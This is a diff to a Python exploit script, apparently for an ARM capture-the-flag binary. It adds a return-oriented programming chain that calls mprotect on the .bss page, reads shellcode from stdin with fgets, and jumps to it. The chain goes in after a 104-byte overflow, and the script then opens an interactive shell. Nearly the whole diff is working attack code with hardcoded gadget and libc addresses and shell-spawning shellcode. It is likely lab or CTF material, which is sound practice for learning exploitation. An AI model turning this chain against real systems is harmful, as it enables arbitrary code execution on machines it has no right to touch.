@@ -46,7 +46,7 @@ shellcode = "\x01\x30\x8f\xe2" + "\x13\xff\x2f\xe1" +\
             "\x2f\x73\x68";
 
 def get_payload(ret,r4,r5,r6,r7,r8,r9):
-    payload = ""             # POP.W  {R3-R9,PC}
+    payload = ""                 # POP.W  {R3-R9,PC}
     payload += l32(ret)      #     R3
     payload += l32(r4)       #     R4
     payload += l32(r5)       # RO<-R5
@@ -57,8 +57,26 @@ def get_payload(ret,r4,r5,r6,r7,r8,r9):
     payload += l32(gadget_2) #    PC
     return payload
 
-# mprotect -> fgets -> call
-payload_2 =
+bss_addr = 0x6b000  # bit:0
+mprotect = 0x12570  # bit:0
+page_size = 0x1000
+fgets = 0xa1b0+1      # bit:1
+stdin = 0x6c370
+'''
+mprotect -> fgets -> call
+'''
+# mprotect shellcode
+rop = get_payload(mprotect, 0x61616161, bss_addr, page_size, 0x7,\
+                    0x61616161, 0x61616162)
+# fgets shellcode
+rop += get_payload(fgets, 0x61616161, bss_addr, len(shellcode)+1,\
+                    stdin, 0x61616161, 0x61616162)
+# call shellcode
+rop += get_payload(bss_addr, 0x61616161, 0x61616161, 0x61616161,\
+                        0x61616161, 0x61616161, 0x61616162)
+#log(len(rop), 'red')
+payload_2 = "A"*104 + l32(gadget_1) + rop
 
 io.writeline(payload_2)
+io.writeline(shellcode)
 io.interact()
